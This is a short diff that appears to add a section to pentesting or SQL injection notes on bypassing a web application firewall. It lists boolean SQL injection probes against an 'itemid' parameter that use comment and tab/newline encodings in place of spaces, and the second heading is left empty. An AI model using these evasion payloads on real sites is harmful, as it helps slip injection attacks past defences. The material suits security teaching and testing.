@@ -448,3 +448,18 @@ itemid=10000 → No data
 
 ```
 
+```
+This is where real pentesting starts: WAF Bypass
+
+?programid=1&itemid=10088
+
+1. No-space bypass
+   
+10088/**/AND/**/1=1
+10088%09AND%091=1
+10088%0aAND%0a1=1
+
+1. Inline comment trick
+   
+
+```
